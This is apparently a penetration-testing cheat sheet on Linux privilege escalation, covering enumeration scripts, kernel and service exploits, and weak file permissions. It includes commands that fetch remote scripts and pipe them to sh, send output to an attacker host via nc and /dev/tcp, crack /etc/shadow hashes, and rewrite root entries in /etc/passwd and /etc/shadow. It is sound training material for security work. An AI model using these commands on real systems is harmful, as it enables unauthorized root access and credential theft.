# Linux Privesc

## <mark style="color:red;">Introduction</mark>

1. Use the "id" and "whoami" commands to check your user account.
2. Execute [Linux Smart Enumeration](linux-privesc.md#linux-smart-enumeration) (lse.sh) with progressively increasing levels to gather more detailed information about the system.
3. Run [LinEnum ](linux-privesc.md#linenum)and other relevant scripts to identify potential vulnerabilities and security-related issues that may lead to privilege escalation.

Take the time to carefully review the results of your enumeration. If Linux Smart Enumeration at level 0 or 1 identifies something noteworthy, make a note of it. To avoid getting sidetracked, make a checklist of the prerequisites needed for the privilege escalation method to work.&#x20;

Check for files in the user's home directory and other common locations, such as "/var/backup" or "/var/logs". If the user has a history file, read it as it may contain valuable information like commands or passwords.&#x20;

Start with simpler methods that require fewer steps, such as Sudo, Cron Jobs, and SUID files. Examine root processes, determine their versions, and search for potential exploits. Look for internal ports that can be forwarded to your attack machine.&#x20;

If you still haven't obtained root access, go back and review the full enumeration results again, and highlight anything that appears unusual, such as unfamiliar process or file names, non-standard filesystems (anything other than ext, swap, or tmpfs on Linux), or unusual usernames. At this point, you can also begin exploring the possibility of kernel exploits.

## <mark style="color:red;">Tools</mark>

### <mark style="color:blue;">Linux Smart Enumeration</mark>

Download from [here](https://github.com/diego-treitos/linux-smart-enumeration).

Linux Smart Enumeration has several levels that progressively disclose more detailed information.

```bash
wget http://<kali_ip>:<port>/lse.sh #Download it from Kali
chmod +x lse.sh
./lse.sh -i -C | grep yes
./lse.sh -s <SELECTION> -l <LEVEL_0-2>
```

<details>

<summary>How to use lse.sh</summary>

The idea is to get the information gradually.

First you should execute it just like `./lse.sh`. If you see some green `yes!`, you probably have already some good stuff to work with.

If not, you should try the `level 1` verbosity with `./lse.sh -l1` and you will see some more information that can be interesting.

If that does not help, `level 2` will just dump everything you can gather about the service using `./lse.sh -l2`. In this case you might find useful to use `./lse.sh -l2 | less -r`.

You can also select what tests to execute by passing the `-s` parameter. With it you can select specific tests or sections to be executed. For example `./lse.sh -l2 -s usr010,net,pro` will execute the test `usr010` and all the tests in the sections `net` and `pro`.



```
  -l LEVEL     Output verbosity level
                 0: Show highly important results. (default)
                 1: Show interesting results.
                 2: Show all gathered information.
  -s SELECTION Comma separated list of sections or tests to run. Available
               sections:
                 usr: User related tests.
                 sud: Sudo related tests.
                 fst: File system related tests.
                 sys: System related tests.
                 sec: Security measures related tests.
                 ret: Recurren tasks (cron, timers) related tests.
                 net: Network related tests.
                 srv: Services related tests.
                 pro: Processes related tests.
                 sof: Software related tests.
                 ctn: Container (docker, lxc) related tests.
                 cve: CVE related tests.
               Specific tests can be used with their IDs (i.e.: usr020,sud)
```

</details>

### <mark style="color:blue;">LinEnum</mark>

Download from [here](https://github.com/rebootuser/LinEnum).

LinEnum is a powerful Bash script that can extract a wealth of valuable information from a target system. The tool can also copy important files for export and search for files that contain specific keywords, such as "password".

### <mark style="color:blue;">LinPEAS</mark>

Downlaod from [here](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh).

Run LinPEAS saving colors:

<pre class="language-bash"><code class="lang-bash">./linpeas.sh | tee -a linpeas.out

# Upload the file to Kali
<strong>systemctl stop ssh.socket
</strong>scp /tmp/linpeas.out kali@&#x3C;kali_ip>:/home/kali/Offensive/PGs/
</code></pre>

```bash
# Local network
sudo python -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

```bash
# Output to file
./linpeas.sh -a > ./linpeas.out #Victim
less -r /dev/shm/linpeas.txt #Read with colors
```

```bash
# Use a linpeas binary
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```

## <mark style="color:red;">Kernel Exploits</mark>

Locating and utilizing kernel exploits is typically a straightforward process:

* Perform enumeration to identify the kernel version (using a command such as "uname -a").
* Search for relevant exploits that match the kernel version on search engines like Google, ExploitDB, or GitHub.
* Compile and execute the exploit, but exercise caution as kernel exploits can be unstable, single-use only, and may cause system crashes.

1. Enumerate the kernel version:

```bash
uname -a
    Linux debian 2.6.32-5-amd64 1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
```

2. Use searchsploit to find matching exploits:

```
searchsploit linux kernel 2.6.32 priv esc
```

3. We can try and adjust our search to be less specific with the kernel version, but more specific with the distribution:

```
searchsploit linux kernel 2.6 priv esc debian
```

4. Install Linux Exploit Suggester 2 (https://github.com/jondonas/linux-exploit- suggester-2) and run the tool against the original kernel version:&#x20;

```bash
./linux-exploit-suggester-2.pl –k 2.6.32
```

## <mark style="color:red;">Service Exploits</mark>

To display all processes that are currently running with root privileges, use the following command:

```
ps aux | grep "^root"
```

With any results, try to identify the version number of the program being executed.

Running the program with the --version/-v command line option often shows the version number:

```
<program> --version
<program> -v
```

On Debian-like distributions, dpkg can show installed programs and their version:

```
dpkg -l | grep <program>
```

On systems that use rpm, the following achieves the same:

```
rpm –qa | grep <program>
```

### <mark style="color:blue;">Port Forwarding</mark>

In certain cases, a root process may be linked to an internal port for communication purposes. If, for any reason, you cannot run an exploit on the target machine itself, you can forward the port to your local machine using SSH:

```
ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
```

The exploit code can now be run on your local machine at whichever port you chose.

## <mark style="color:red;">Weak File Permissions</mark>

Find all writable files in /etc:

```
find /etc -maxdepth 1 -writable -type f
```

Find all readable files in /etc:

```
find /etc -maxdepth 1 -readable -type f
```

Find all directories which can be written to:

```
find / -executable -writable -type d 2> /dev/null
```

### <mark style="color:blue;">World Readable /etc/shadow</mark>

1. Check the permissions of the /etc/shadow file and note that it is world readable:

```
ls -l /etc/shadow
    -rw-r—rw- 1 root shadow 810 May 13 2017 /etc/shadow
```

2. Extract the root user’s password hash:

<pre><code>head -n 1 /etc/shadow
    root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXv
<strong>    RDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
</strong></code></pre>

3. Save the password hash in a file (e.g. hash.txt):

```
echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
```

4. Crack the password hash using john:

```
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

5. Use the su command to switch to the root user, entering the password we cracked when prompted:

```
su
Password:
root@debian:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### <mark style="color:blue;">World Writable /etc/shadow</mark>

1. Check the permissions of the /etc/shadow file and note that it is world writable:

```
ls -l /etc/shadow
    -rw-r—rw- 1 root shadow 810 May 13 2017 /etc/shadow
```

2. Copy / save the contents of /etc/shadow so we can restore it later.
3. Generate a new SHA-512 password hash:

```
mkpasswd -m sha-512 newpassword
    $6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VE
    WwO/okK3vi1IdVaO9.xt4IQMY4OUj/
```

4. Edit the /etc/shadow and replace the root user’s password hash with the one we generated.

```
root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoO
lL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:99999:7:::
```

5. Use the su command to switch to the root user, entering the new password when prompted:

```
su
Password:
root@debian:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### <mark style="color:blue;">World Writable /etc/passwd</mark>

The root account in /etc/passwd is usually configured like this:

`root:x:0:0:root:/root:/bin/bash`

The “x” in the second field instructs Linux to look for the password hash in the /etc/shadow file.

In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password:

`root::0:0:root:/root:/bin/bash`

1. Check the permissions of the /etc/passwd file and note that it is world writable.:

```
ls -l /etc/passwd
    -rw-r--rw- 1 root root 951 May 13 2017 /etc/passwd
```

2. Generate a password hash for the password “password” using openssl:

```
openssl passwd "password"
    L9yLGxncbOROc
```

3. Edit the /etc/passwd file and enter the hash in the second field of the root user row:

```
root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
```

4. Use the su command to switch to the root user:

```
su
Password:
# id
uid=0(root) gid=0(root) groups=0(root)
```

5. Alternatively, append a new row to /etc/passwd to create an alternate root user (e.g. newroot):

```
newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
```

6. Use the su command to switch to the newroot user:

```
su newroot
Password:
# id
uid=0(root) gid=0(root) groups=0(root)
```

## <mark style="color:red;">SUIDs and GUIDs</mark>

We can use `find` to locate SUID programs and discover which programs are SUID:

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

Next we can use this source to find exploitable methods of the found binary:

GTFO Bins:&#x20;

{% embed url="https://gtfobins.github.io/" %}

## <mark style="color:red;">Stored Passwords</mark>

View the contents of hidden files in the user’s home directory:

```
$ cat ~/.*history | less
ls -al
cat .bash_history
ls -al
mysql -h somehost.local -uroot -ppassword123
```

You can also check for configuration files inside the OS.

## <mark style="color:red;">NFS</mark>

Show the NFS server’s export list:

```
$ showmount -e <target>
```

Similar Nmap script:

```
$ nmap –sV –script=nfs-showmount <target>
```

Mount an NFS share:

```
$ mount -o rw,vers=2 <target>:<share> <local_directory>
```
